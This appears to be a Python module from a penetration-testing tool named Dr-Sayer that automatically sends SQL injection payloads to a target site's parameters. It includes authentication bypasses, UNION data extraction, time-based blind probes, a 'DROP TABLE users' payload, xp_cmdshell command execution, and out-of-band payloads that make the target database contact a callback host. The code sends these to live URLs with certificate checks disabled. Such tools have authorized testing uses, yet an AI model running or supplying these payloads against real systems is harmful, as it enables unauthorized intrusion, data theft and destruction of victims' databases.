"""
SQL Injection Testing Module for Dr-Sayer
Author: SayerLinux (SayerLinux@outlook.sa)
Enhanced for Real Penetration Testing
"""

import requests
import time
import random
import string
import json
from typing import List, Dict, Any
from urllib.parse import urlparse, parse_qs, urlencode

class SQLInjectionTester:
    """Advanced SQL Injection vulnerability tester with real detection"""
    
    def __init__(self, enable_oob: bool = False, oob_callback: str = None, timeout: int = 15):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        self.enable_oob = enable_oob
        self.oob_callback = oob_callback
        self.timeout = timeout
        self.baseline_response = None
        self.baseline_length = 0
        self.baseline_time = 0
        
        # SQL Injection payloads for different databases with advanced techniques
        self.payloads = {
            'mysql': [
                # Basic authentication bypass
                "' OR '1'='1",
                "' OR 1=1--",
                "admin' OR '1'='1",
                "admin'--",
                # Union-based
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL--",
                "' UNION SELECT VERSION()--",
                "' UNION SELECT DATABASE()--",
                # Time-based blind
                "' OR SLEEP(5)--",
                "' AND SLEEP(5)--",
                "1' AND SLEEP(5)--",
                # Boolean-based blind
                "' AND '1'='1",
                "' AND '1'='2",
                "' AND SUBSTRING(VERSION(),1,1)='5",
                # Advanced evasion
                "' /*!50000OR*/ 1=1--",
                "' /*! OR */1=1--",
                "' || 1=1--",
                "';DROP TABLE users;--",
                "' OR CHAR(65)='A",
                "' OR CONVERT(INT,(SELECT @@version))--",
            ],
            'mssql': [
                "' OR 1=1--",
                "' OR 1=1;--",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT @@version--",
                "' UNION SELECT user_name()--",
                "'; WAITFOR DELAY '0:0:5'--",
                "' AND WAITFOR DELAY '0:0:5'--",
                "'; EXEC xp_cmdshell('dir')--",
                "' AND 1=CAST((SELECT COUNT(*) FROM master.dbo.sysobjects) AS INT)--",
                "' AND (SELECT TOP 1 name FROM master.dbo.sysobjects) IS NOT NULL--",
                "';SELECT @@version;--",
                "' AND SUBSTRING(user,1,1)='s",
            ],
            'oracle': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL FROM DUAL--",
                "' UNION SELECT NULL,NULL FROM DUAL--",
                "' UNION SELECT user FROM DUAL--",
                "' UNION SELECT banner FROM v$version WHERE ROWNUM=1--",
                "'; SELECT pg_sleep(5)--",
                "' AND DBMS_PIPE.RECEIVE_MESSAGE('RDS', 5)=0--",
                "' OR ROWNUM=1--",
                "' OR 1 IN (SELECT 1 FROM DUAL) --",
            ],
            'postgresql': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT version()--",
                "' UNION SELECT current_user--",
                "'; SELECT pg_sleep(5)--",
                "' AND pg_sleep(5)--",
                "' AND 1=1;SELECT 1--",
                "' OR EXISTS(SELECT 1)--",
                "' AND '\\\\'='\\\\",
                "' AND '1'::int::text='1",
            ]
        }
        
        # Error-based detection patterns
        self.error_patterns = {
            'mysql': [
                'mysql_fetch_array',
                'mysql_num_rows',
                'You have an error in your SQL syntax',
                'mysql_error',
                'supplied argument is not a valid MySQL result'
            ],
            'mssql': [
                'Microsoft OLE DB Provider for ODBC Drivers',
                'ODBC SQL Server Driver',
                'SQL Server',
                'Unclosed quotation mark',
                'OLE DB Provider for SQL Server'
            ],
            'oracle': [
                'ORA-',
                'Oracle error',
                'Oracle driver',
                'Oracle ODBC'
            ],
            'postgresql': [
                'PostgreSQL query failed',
                'pg_query',
                'pg_fetch_array',
                'PostgreSQL'
            ]
        }
        
        # Time-based detection payloads
        self.time_payloads = {
            'mysql': "1' AND SLEEP(5)--",
            'mssql': "1'; WAITFOR DELAY '0:0:5'--",
            'oracle': "1' AND DBMS_PIPE.RECEIVE_MESSAGE('RDS', 5)=0--",
            'postgresql': "1'; SELECT pg_sleep(5)--"
        }
        
        self.oob_payloads = {
            'mssql': [
                "'; DECLARE @x VARCHAR(255); SET @x='\\\\\\\\{host}\\\\oob'; EXEC master..xp_dirtree @x--"
            ],
            'oracle': [
                "' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('{host}') FROM DUAL--"
            ],
            'mysql': [
                "1' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\\\\\\\\\','{host}','\\\\\\\\oob'))--"
            ]
        }
    
    def detect_database_type(self, response_text: str) -> str:
        """Detect database type based on error messages"""
        for db_type, patterns in self.error_patterns.items():
            for pattern in patterns:
                if pattern.lower() in response_text.lower():
                    return db_type
        return 'generic'
    
    def test_parameter(self, url: str, param: str, method: str = 'GET') -> Dict[str, Any]:
        """Test a specific parameter for SQL injection with baseline establishment"""
        vulnerabilities = []
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        if not params:
            params = {param: ['test']}
        
        # Establish baseline response
        baseline = self._get_baseline_response(url, param, params, method)
        db_type = 'generic'
        
        # Test each payload category
        for payload_category, payload_list in self.payloads.items():
            for payload in payload_list[:10]:  # Test first 10 payloads per category
                test_params = params.copy()
                if param in test_params:
                    original_value = test_params[param][0]
                    # Test with payload appended
                    test_params[param] = [original_value + payload]
                else:
                    test_params[param] = [payload]
                
                # Build test URL
                test_url = self._build_url(parsed_url, test_params, method)
                
                try:
                    # Make request with timeout
                    start_time = time.time()
                    if method.upper() == 'GET':
                        response = self.session.get(test_url, timeout=self.timeout, verify=False)
                    else:
                        response = self.session.post(test_url, data=test_params, timeout=self.timeout, verify=False)
                    
                    response_time = time.time() - start_time
                    response_length = len(response.text)
                    
                    # Check for SQL errors (error-based detection)
                    if self.contains_sql_errors(response.text):
                        detected_db = self.detect_database_type(response.text)
                        if detected_db != 'generic':
                            db_type = detected_db
                        
                        vulnerability = {
                            'type': 'SQL Injection',
                            'parameter': param,
                            'payload': payload,
                            'database': detected_db,
                            'severity': 'Critical',
                            'description': f'SQL injection vulnerability detected in parameter: {param}',
                            'evidence': self.extract_error_evidence(response.text),
                            'url': test_url,
                            'method': method,
                            'detection_method': 'Error-based',
                            'confidence': 'High'
                        }
                        vulnerabilities.append(vulnerability)
                        print(f"  🚨 SQL Injection found in {param} - Error-based")
                        break
                    
                    # Check for response difference (boolean-based detection)
                    if baseline and self._is_response_different(response.text, baseline, response_length):
                        vulnerability = {
                            'type': 'SQL Injection',
                            'parameter': param,
                            'payload': payload,
                            'database': db_type,
                            'severity': 'High',
                            'description': f'SQL injection vulnerability detected (boolean-based) in parameter: {param}',
                            'evidence': f'Response length changed from {self.baseline_length} to {response_length}',
                            'url': test_url,
                            'method': method,
                            'detection_method': 'Boolean-based',
                            'confidence': 'Medium'
                        }
                        vulnerabilities.append(vulnerability)
                        print(f"  🚨 SQL Injection found in {param} - Boolean-based")
                        break
                    
                    # Check for time-based detection
                    if response_time > (self.baseline_time + 4):
                        vulnerability = {
                            'type': 'SQL Injection',
                            'parameter': param,
                            'payload': payload,
                            'database': db_type,
                            'severity': 'High',
                            'description': f'Time-based blind SQL injection vulnerability detected in parameter: {param}',
                            'evidence': f'Response time: {response_time:.2f}s (baseline: {self.baseline_time:.2f}s)',
                            'url': test_url,
                            'method': method,
                            'detection_method': 'Time-based blind',
                            'confidence': 'High',
                            'response_time': response_time
                        }
                        vulnerabilities.append(vulnerability)
                        print(f"  🚨 Time-based SQL Injection found in {param}")
                        break
                    
                except requests.exceptions.Timeout:
                    # Timeout might indicate time-based injection
                    vulnerability = {
                        'type': 'SQL Injection',
                        'parameter': param,
                        'payload': payload,
                        'database': db_type,
                        'severity': 'High',
                        'description': f'Possible time-based SQL injection (request timeout) in parameter: {param}',
                        'evidence': f'Request timed out after {self.timeout}s',
                        'url': test_url,
                        'method': method,
                        'detection_method': 'Time-based (timeout)',
                        'confidence': 'Medium'
                    }
                    vulnerabilities.append(vulnerability)
                    print(f"  🚨 Time-based SQL Injection (timeout) found in {param}")
                    break
                    
                except requests.exceptions.RequestException as e:
                    print(f"  [-] Request failed: {str(e)}")
                    continue
        
        if self.enable_oob and self.oob_callback:
            try:
                oob_findings = self.perform_oob_probe(parsed_url, params, param, method)
                vulnerabilities.extend(oob_findings)
            except Exception as e:
                print(f"  [-] OOB probe failed: {str(e)}")
        
        return {
            'parameter': param,
            'vulnerabilities': vulnerabilities,
            'database_type': db_type
        }
    
    def _get_baseline_response(self, url: str, param: str, params: Dict, method: str) -> str:
        """Get baseline response to compare against"""
        try:
            test_url = self._build_url(urlparse(url), params, method)
            start_time = time.time()
            
            if method.upper() == 'GET':
                response = self.session.get(test_url, timeout=self.timeout, verify=False)
            else:
                response = self.session.post(test_url, data=params, timeout=self.timeout, verify=False)
            
            self.baseline_time = time.time() - start_time
            self.baseline_length = len(response.text)
            return response.text
        except:
            return None
    
    def _build_url(self, parsed_url, params: Dict, method: str) -> str:
        """Build complete URL with parameters"""
        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        if method.upper() == 'GET':
            test_url += f"?{urlencode(params, doseq=True)}"
        return test_url
    
    def _is_response_different(self, response_text: str, baseline: str, current_length: int) -> bool:
        """Check if response differs significantly from baseline"""
        # Check length difference
        length_diff = abs(current_length - self.baseline_length)
        if length_diff > self.baseline_length * 0.1:  # 10% difference
            return True
        
        # Check for database-specific patterns
        db_patterns = ['rows', 'affecting', 'changed', 'matched']
        for pattern in db_patterns:
            if pattern in response_text.lower():
                return True
        
        return False
    
    def test_time_based_injection(self, url: str, param: str, method: str) -> Dict[str, Any]:
        """Advanced time-based blind SQL injection testing"""
        # Test with multiple sleep durations to increase confidence
        sleep_durations = [3, 5, 10]
        
        for db_type, payload_template in [
            ('mysql', "' AND SLEEP({})--"),
            ('postgresql', "'; SELECT pg_sleep({})--"),
            ('mssql', "'; WAITFOR DELAY '0:0:{}'--"),
            ('oracle', "' AND DBMS_PIPE.RECEIVE_MESSAGE('RDS', {})=0--")
        ]:
            for duration in sleep_durations:
                try:
                    payload = payload_template.format(duration)
                    test_url = url + payload if param not in url else url.replace(param, param + payload)
                    
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=self.timeout + 5, verify=False)
                    response_time = time.time() - start_time
                    
                    if response_time >= (duration - 1):
                        return {
                            'type': 'SQL Injection (Time-based Blind)',
                            'database': db_type,
                            'duration': duration,
                            'response_time': response_time,
                            'severity': 'High'
                        }
                except:
                    pass
        
        return None
    
    
    def contains_sql_errors(self, text: str) -> bool:
        """Check if response contains SQL error messages"""
        for db_type, patterns in self.error_patterns.items():
            for pattern in patterns:
                if pattern.lower() in text.lower():
                    return True
        return False
    
    def extract_error_evidence(self, text: str) -> str:
        """Extract SQL error evidence from response"""
        for db_type, patterns in self.error_patterns.items():
            for pattern in patterns:
                if pattern.lower() in text.lower():
                    # Extract a snippet around the error
                    start = text.lower().find(pattern.lower())
                    snippet = text[max(0, start-50):start+len(pattern)+50]
                    return snippet.strip()
        return ""
    
    def discover_parameters(self, url: str) -> List[str]:
        """Discover parameters in URL or forms"""
        params = []
        
        # Parse URL parameters
        parsed_url = urlparse(url)
        url_params = parse_qs(parsed_url.query)
        params.extend(list(url_params.keys()))
        
        # Try to discover forms
        try:
            response = self.session.get(url, timeout=10)
            # Simple form parameter discovery (can be enhanced)
            if 'name="' in response.text:
                import re
                form_params = re.findall(r'name=["\']([^"\']+)["\']', response.text)
                params.extend(form_params)
        except:
            pass
        
        return list(set(params))  # Remove duplicates
    
    def test_target(self, target_url: str, parameters: List[str] = None) -> Dict[str, Any]:
        """Main method to test target for SQL injection vulnerabilities"""
        print(f"[*] Starting SQL injection tests on {target_url}")
        
        all_vulnerabilities = []
        
        # Discover parameters if not provided
        if not parameters:
            print("[*] Discovering parameters...")
            parameters = self.discover_parameters(target_url)
            print(f"[*] Found parameters: {parameters}")
        
        # Test each parameter
        for param in parameters:
            print(f"[*] Testing parameter: {param}")
            result = self.test_parameter(target_url, param)
            all_vulnerabilities.extend(result.get('vulnerabilities', []))
        
        return {
            'target': target_url,
            'total_tests': len(parameters) * sum(len(payloads) for payloads in self.payloads.values()),
            'vulnerabilities': all_vulnerabilities,
            'parameters_tested': parameters
        }
    
    def perform_oob_probe(self, parsed_url, params, param, method) -> List[Dict[str, Any]]:
        findings = []
        host = self.oob_callback.strip()
        oob_set = []
        for db, plist in self.oob_payloads.items():
            for p in plist:
                oob_set.append((db, p.format(host=host)))
        for db, payload in oob_set:
            test_params = params.copy() if params else {}
            value = test_params.get(param, ['test'])[0]
            test_params[param] = [value + payload]
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            if method.upper() == 'GET':
                test_url += f"?{urlencode(test_params, doseq=True)}"
            try:
                if method.upper() == 'GET':
                    self.session.get(test_url, timeout=10)
                else:
                    self.session.post(test_url, data=test_params, timeout=10)
                findings.append({
                    'type': 'SQL Injection OOB Probe',
                    'parameter': param,
                    'payload': payload,
                    'database': db,
                    'severity': 'Info',
                    'description': 'Out-of-band probe sent. Verify collaborator logs.',
                    'evidence': f'Callback host: {host}',
                    'url': test_url,
                    'method': method
                })
            except requests.exceptions.RequestException as e:
                findings.append({
                    'type': 'SQL Injection OOB Probe',
                    'parameter': param,
                    'payload': payload,
                    'database': db,
                    'severity': 'Info',
                    'description': 'Out-of-band probe attempt failed',
                    'evidence': str(e),
                    'url': test_url,
                    'method': method
                })
        return findings
    
    def generate_report_data(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Generate formatted report data"""
        return {
            'module': 'SQL Injection',
            'target': results['target'],
            'total_vulnerabilities': len(results['vulnerabilities']),
            'vulnerabilities': results['vulnerabilities'],
            'parameters_tested': results['parameters_tested'],
            'testing_timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
